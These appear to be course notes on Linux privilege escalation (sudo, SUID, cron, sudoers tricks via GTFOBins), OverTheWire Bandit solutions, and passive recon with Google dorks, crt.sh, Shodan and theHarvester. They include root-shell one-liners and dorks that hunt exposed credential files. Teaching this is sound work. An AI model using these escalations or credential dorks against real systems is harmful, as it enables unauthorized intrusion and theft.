## Day 21 — sudo, Root & Linux Privilege Model

### The Linux Privilege Model

Linux uses a user/group permission model. Every process runs under a specific user account and inherits that account's permissions. The root account (UID 0) has unrestricted access to everything.

**The privilege escalation goal on Linux:**
Start as a low-privilege user (e.g. `www-data` from a web exploit) → become root.

---

### /etc/passwd — User Database

```bash
cat /etc/passwd
```

Format of each line:
```
username:x:UID:GID:GECOS:home_directory:shell
root:x:0:0:root:/root:/bin/bash
cyberuser:x:1000:1000::/home/cyberuser:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Key fields:**
- `x` in password field means password is in `/etc/shadow`
- UID 0 = root — any account with UID 0 has root privileges
- `/usr/sbin/nologin` as shell = account can't log in interactively (service accounts)
- `/bin/false` as shell = same, can't get a shell

**Pentesting relevance:** Check for accounts with UID 0 that aren't named root:
```bash
awk -F: '$3 == 0 {print $1}' /etc/passwd
```

If anything other than `root` shows up — that's a backdoor account.

---

### /etc/shadow — Password Hashes

Readable only by root. Contains hashed passwords.

```bash
sudo cat /etc/shadow
```

Format:
```
username:$algorithm$salt$hash:lastchange:min:max:warn:inactive:expire
cyberuser:$6$salt$hashedpw:19000:0:99999:7:::
```

**Hash algorithm identifiers:**
```
$1$   = MD5 (very weak, crack instantly)
$5$   = SHA-256
$6$   = SHA-512 (standard on modern Linux)
$y$   = yescrypt (modern systems)
$2b$  = bcrypt
*     = account locked
!     = account locked (password disabled)
```

If you get root access, dump `/etc/shadow` and crack offline with hashcat or John the Ripper.

---

### sudo — Controlled Privilege Escalation

`sudo` allows specific users to run specific commands as root (or another user) without knowing the root password.

```bash
sudo command               — run command as root
sudo -u username command   — run command as a specific user
sudo -l                    — list what sudo allows for current user
sudo -i                    — interactive root shell (if permitted)
sudo su                    — switch to root shell
```

**`sudo -l` — the most important command for Linux privesc**

```bash
sudo -l
```

Output example:
```
User cyberuser may run the following commands on ubuntu-lab:
    (ALL : ALL) ALL                         # can run anything as root
    (root) NOPASSWD: /usr/bin/nmap          # run nmap as root, no password
    (root) /usr/bin/python3 /opt/script.py  # specific script only
```

**Interpreting sudo -l:**
- `(ALL : ALL) ALL` = full root access via sudo — you're effectively root already
- `NOPASSWD:` = no password required to run this command
- Specific binary = only that binary can be run as root

---

### GTFOBins — sudo Privilege Escalation

GTFOBins (gtfobins.github.io) is a database of Unix binaries that can be exploited for privilege escalation when run with elevated permissions.

**If sudo -l shows you can run a binary as root, check GTFOBins for it.**

Common examples:

**sudo vim:**
```bash
sudo vim -c ':!/bin/bash'       # open vim as root, escape to root shell
```

**sudo find:**
```bash
sudo find . -exec /bin/bash \;  # exec bash via find running as root
```

**sudo python3:**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**sudo nmap (older versions):**
```bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

**sudo less:**
```bash
sudo less /etc/passwd
!/bin/bash                      # type this inside less to escape to root shell
```

---

### SUID Privilege Escalation

After finding SUID binaries with `find / -perm -4000 -type f 2>/dev/null`, check each one against GTFOBins.

**Common SUID exploits:**

**SUID bash (if bash has SUID):**
```bash
bash -p                         # -p preserves effective UID (runs as owner = root)
```

**SUID find:**
```bash
find . -exec /bin/bash -p \;
```

**SUID vim:**
```bash
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'
```

---

### Cron Jobs — Scheduled Task Privesc

Cron jobs run commands automatically on a schedule. If a cron job runs as root and you can modify the script it calls, you get root code execution.

```bash
cat /etc/crontab                — system-wide cron jobs
ls -la /etc/cron.d/             — additional cron config files
ls -la /etc/cron.daily/         — daily jobs
crontab -l                      — current user's cron jobs
```

**Crontab format:**
```
* * * * * root /opt/cleanup.sh
^ ^ ^ ^ ^
| | | | day of week (0-7, 0=Sunday)
| | | month (1-12)
| | day of month (1-31)
| hour (0-23)
minute (0-59)
```

**If a root cron job calls a script you can write to:**
```bash
echo "chmod +s /bin/bash" >> /opt/cleanup.sh
# Wait for cron to run...
bash -p                         # bash is now SUID — get root shell
```

---

### /etc/sudoers — sudo Configuration

```bash
sudo cat /etc/sudoers
```

Format:
```
root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL          # members of sudo group get full access
cyberuser ALL=(root) NOPASSWD: /usr/bin/nmap
```

**Writable /etc/sudoers = instant root:**
```bash
ls -la /etc/sudoers                 # check if writable (shouldn't be, but check)
echo "cyberuser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash
```

### Linux Privesc Checklist

Run through this on every compromised Linux machine:

```bash
# 1. Who am I?
id && whoami

# 2. What can I sudo?
sudo -l

# 3. SUID files
find / -perm -4000 -type f 2>/dev/null

# 4. World-writable files
find / -perm -0777 -type f 2>/dev/null

# 5. Cron jobs
cat /etc/crontab && ls /etc/cron.*

# 6. Running processes
ps aux | grep root

# 7. Network services
ss -tulpn

# 8. Interesting files
find /home -name ".bash_history" 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# 9. Kernel version (for kernel exploits)
uname -r

# 10. OS version
cat /etc/os-release
```

**Automate it:** Download LinPEAS for automated enumeration:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

## Day 22 — Linux Week Review + OverTheWire Bandit

### OverTheWire Bandit — Full Walkthrough Guide

Bandit teaches Linux command-line skills through a wargame format. Each level requires finding a password to SSH into the next level.

**Connection:**
```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
# Password for level 0: bandit0
```

---

### Bandit Levels 0–12 — Solutions and Learning Points

**Level 0 → 1:** Read a file called `readme` in the home directory
```bash
cat readme
```
*Learn: basic file reading*

**Level 1 → 2:** Read a file named `-` (dash)
```bash
cat ./-           # ./ prefix needed because - is interpreted as stdin
cat < -           # alternative approach
```
*Learn: special filenames need prefixes*

**Level 2 → 3:** Read a file with spaces in the name
```bash
cat "spaces in this filename"
cat spaces\ in\ this\ filename    # escape spaces with backslash
```
*Learn: handling filenames with spaces*

**Level 3 → 4:** Read a hidden file inside a directory
```bash
cd inhere/
ls -la            # -a shows hidden files
cat .hidden
```
*Learn: hidden files start with a dot*

**Level 4 → 5:** Find the only human-readable file among several
```bash
cd inhere/
file ./-file0*    # file command identifies file types
cat ./-file07     # the ASCII file
```
*Learn: `file` command identifies file types without extensions*

**Level 5 → 6:** Find a file with specific properties (human-readable, 1033 bytes, non-executable)
```bash
find . -type f -size 1033c ! -executable
cat ./maybehere07/.file2
```
*Learn: `find` with multiple conditions, `!` negates a condition, `c` = bytes*

**Level 6 → 7:** Find a file owned by user bandit7, group bandit6, 33 bytes
```bash
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
```
*Learn: find by owner and group across the whole system*

**Level 7 → 8:** Find the word "millionth" in a large file
```bash
grep "millionth" data.txt
```
*Learn: grep for specific content in large files*

**Level 8 → 9:** Find the line that appears only once in a file
```bash
sort data.txt | uniq -u
```
*Learn: `sort` then `uniq -u` — uniq only works on sorted input, `-u` shows unique lines*

**Level 9 → 10:** Find human-readable strings in a binary file preceded by `=`
```bash
strings data.txt | grep "==="
```
*Learn: `strings` extracts readable text from binary files*

**Level 10 → 11:** Decode a Base64 encoded file
```bash
base64 -d data.txt
```
*Learn: Base64 decoding from command line*

**Level 11 → 12:** ROT13 decode a file
```bash
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
*Learn: `tr` for character translation, ROT13 shifts letters by 13*

**Level 12 → 13:** Reverse a hexdump and decompress multiple layers
```bash
xxd -r data.txt > /tmp/data       # reverse hexdump
file /tmp/data                    # identify compression type
# decompress repeatedly based on file type:
mv /tmp/data /tmp/data.gz && gunzip /tmp/data.gz     # gzip
mv /tmp/data /tmp/data.bz2 && bunzip2 /tmp/data.bz2  # bzip2
mv /tmp/data /tmp/data.tar && tar xf /tmp/data.tar   # tar
```
*Learn: `xxd`, `file`, multiple decompression tools — patience and systematic approach*

## Day 23 — Passive Recon: WHOIS, Google Dorks & robots.txt

### Passive vs Active Recon

| Type | Definition | Target sees it? | Legal without permission? |
|---|---|---|---|
| Passive | Reading publicly available info — no direct contact with target | No | Yes |
| Active | Directly probing target systems — port scanning, sending requests | Yes — generates logs | Only with permission |

**Always complete passive recon before any active scanning.** Passive recon shapes your active recon — knowing what tech stack a target uses tells you exactly which ports and services to look for.

---

### WHOIS — Domain Registration Data

WHOIS queries the domain registration database for ownership and infrastructure information.

```bash
whois example.com               — domain WHOIS
whois 93.184.216.34             — IP address WHOIS (finds the network owner)
```

**What to look for in WHOIS output:**

```
Registrar: GoDaddy.com, LLC          → hosting provider hint
Created: 2005-08-14                   → how old is this domain?
Expires: 2025-08-14                   → expiring soon = potential domain takeover
Name Server: ns1.example.com         → their DNS infrastructure
Registrant: REDACTED FOR PRIVACY     → privacy protected (common)
Registrant Email: admin@example.com  → if not protected — email for phishing/OSINT
```

**IP WHOIS:**
```bash
whois 93.184.216.34
```
Shows which organisation owns the IP block — useful for identifying cloud providers (AWS, GCP, Azure) or hosting companies. Knowing the ISP/hosting provider tells you where to look for further infrastructure.

---

### Google Dorks — Complete Reference

Google dorks use search operators to find specific information indexed by Google. This is passive recon — you're only querying Google's index, never touching the target directly.

#### Core Operators

| Operator | Syntax | What it does |
|---|---|---|
| `site:` | `site:example.com` | Results only from this domain |
| `filetype:` | `filetype:pdf` | Results with this file extension |
| `inurl:` | `inurl:admin` | URL contains this string |
| `intitle:` | `intitle:"index of"` | Page title contains this string |
| `intext:` | `intext:"password"` | Page body contains this string |
| `cache:` | `cache:example.com` | Google's cached version |
| `"quotes"` | `"exact phrase"` | Exact phrase match |
| `-` | `-word` | Exclude results containing this word |
| `OR` | `admin OR login` | Either term |
| `*` | `"admin * panel"` | Wildcard |

#### Dangerous Dorks — Find Exposed Data

**Exposed directories:**
```
intitle:"index of" "parent directory"
intitle:"index of" backup
intitle:"index of" password
intitle:"index of" ".env"
intitle:"index of" ".git"
```

**Exposed credential files:**
```
filetype:env "DB_PASSWORD"
filetype:env "AWS_SECRET_ACCESS_KEY"
filetype:log intext:"password"
filetype:sql intext:"INSERT INTO" intext:"password"
filetype:bak inurl:"wp-config"
filetype:txt inurl:"passwords"
```

**Exposed config files:**
```
filetype:xml intext:"password"
filetype:yaml intext:"password"
filetype:conf intext:"password"
filetype:ini intext:"password"
```

**Admin panels:**
```
site:example.com inurl:admin
site:example.com inurl:wp-admin
site:example.com intitle:"admin login"
site:example.com inurl:phpmyadmin
site:example.com inurl:dashboard
```

**Error messages (indicate vulnerable apps):**
```
site:example.com intext:"sql syntax near"
site:example.com intext:"mysql_fetch"
site:example.com intext:"Warning: mysql"
site:example.com intext:"ORA-01756"       — Oracle DB errors
```

**Vulnerable software:**
```
intitle:"phpMyAdmin" inurl:phpmyadmin
intitle:"Tomcat" inurl:8080 intext:"Apache Tomcat"
intext:"Powered by WordPress 4"
intitle:"Webmin" inurl:10000
```

**Cameras and IoT:**
```
intitle:"webcamXP 5" inurl:8080
intitle:"Live View / - AXIS"
inurl:"/viewer/live/index.html"
```

#### The Google Hacking Database (GHDB)

All of these and thousands more are catalogued at:
```
exploit-db.com/google-hacking-database
```

Organised by category — browse it before any recon engagement.

---

### robots.txt — Hidden by Design

`robots.txt` tells search engine crawlers what NOT to index. From a pentester's perspective, it's a map of the most interesting parts of a website.

```bash
curl https://example.com/robots.txt
```

**Example robots.txt:**
```
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /staging/
Disallow: /api/internal/
Disallow: /wp-admin/
Disallow: /.git/
```

Every `Disallow:` entry is worth investigating — these are paths the owner specifically didn't want indexed. Often reveals:
- Admin panels
- Backup directories
- Staging environments (often less secured than production)
- Internal API endpoints
- Version control directories (`.git` exposure = potential source code leak)

---

### sitemap.xml — Complete Site Map

```bash
curl https://example.com/sitemap.xml
```

Lists every page the site wants indexed. Gives you a complete picture of the site structure — subdomains, sections, and pages that might not be linked from the homepage.

---

### Certificate Transparency — Subdomain Discovery

Every SSL certificate issued is publicly logged. This means you can find subdomains without ever touching the target.

```bash
curl "https://crt.sh/?q=%.example.com&output=json" | python3 -m json.tool
```

Or just visit `crt.sh` and search for `%.example.com` in a browser.

**What this reveals:**
```
mail.example.com
dev.example.com
staging.example.com
api.example.com
vpn.example.com
admin.example.com
```

Every subdomain is a potential attack surface — dev and staging environments are often less secured than production.

---

### Wayback Machine — Historical Intelligence

The Wayback Machine (web.archive.org) archives snapshots of websites over time. Useful for:
- Finding pages that were removed (old admin panels, exposed files)
- Seeing old technology stacks
- Finding employee names and contact info from old About pages
- Comparing current vs past configurations

```bash
curl "http://archive.org/wayback/available?url=example.com"
```

Or browse web.archive.org directly.

## Day 24 — Shodan, theHarvester & OSINT Framework

### Shodan — The Search Engine for Internet-Connected Devices

Shodan continuously scans the entire internet and indexes what it finds on every port of every public IP address. It's passive recon — you're querying Shodan's database, not the target directly.

**Create a free account at:** shodan.io

---

### Shodan Search Filters

```
port:22                         — devices with port 22 open (SSH)
port:3389                       — RDP exposed to internet
product:"Apache httpd"          — Apache web servers
product:"nginx"                 — Nginx web servers
product:"OpenSSH"               — SSH servers
os:"Windows Server 2008"        — old vulnerable Windows servers
country:"IN"                    — devices in India
city:"Chennai"                  — devices in Chennai
org:"Jio"                       — devices on Jio's network
hostname:example.com            — specific domain
net:192.168.0.0/24              — specific IP range
ssl.cert.subject.cn:example.com — SSL certificate for this domain
before:2020-01-01               — indexed before this date
after:2023-01-01                — indexed after this date
```

**Combining filters:**
```
port:22 country:"IN" product:"OpenSSH" version:"7.4"
port:3389 os:"Windows Server 2016" country:"IN"
port:80 product:"Apache" org:"BSNL"
```

### theHarvester — Email, Subdomain & IP Harvesting

theHarvester scrapes public sources for email addresses, subdomains, and IP addresses associated with a target domain.

```bash
sudo apt install theharvester -y     # install on Ubuntu
```

**Basic usage:**
```bash
theHarvester -d example.com -b google
theHarvester -d example.com -b bing
theHarvester -d example.com -b bing,dnsdumpster,crtsh
theHarvester -d example.com -b all
theHarvester -d example.com -b bing -l 100 -f output.html
```

**Flags:**
- `-d` — target domain
- `-b` — data source(s)
- `-l` — limit number of results
- `-f` — save output to HTML file

**Reliable free sources (no API key needed):**
| Source | Finds |
|---|---|
| `bing` | Subdomains, emails |
| `dnsdumpster` | Subdomains, DNS records |
| `crtsh` | Subdomains via SSL certs |
| `yahoo` | Subdomains, emails |
| `baidu` | Subdomains |

**Example output:**
```
[*] Emails found:
------------------
admin@example.com
cto@example.com
support@example.com

[*] Hosts found:
------------------
mail.example.com:93.184.216.35
```

**What to do with findings:**

- Subdomains → new attack surface, each one gets its own Nmap scan

### Putting It All Together — Recon Workflow

For any target, follow this order:

```
1. WHOIS → who owns the domain, what DNS providers they use
2. robots.txt + sitemap.xml → site structure, hidden paths
3. crt.sh → all subdomains via certificate transparency
4. Google dorks → exposed files, admin panels, error messages
5. theHarvester → emails, subdomains, IPs from multiple sources
6. Shodan → open ports, software versions, known CVEs on their IPs
7. Wayback Machine → historical pages, old tech stacks
8. OSINT Framework → anything specific to the target type
```

Everything here is passive — you never touch the target's systems directly. By the end of this workflow you have:
- A complete list of subdomains and IPs
- Email addresses and username formats
- Software versions and potential CVEs
- Hidden paths and admin panels
- The complete attack surface mapped

**This is what your Day 30 recon report will document.**
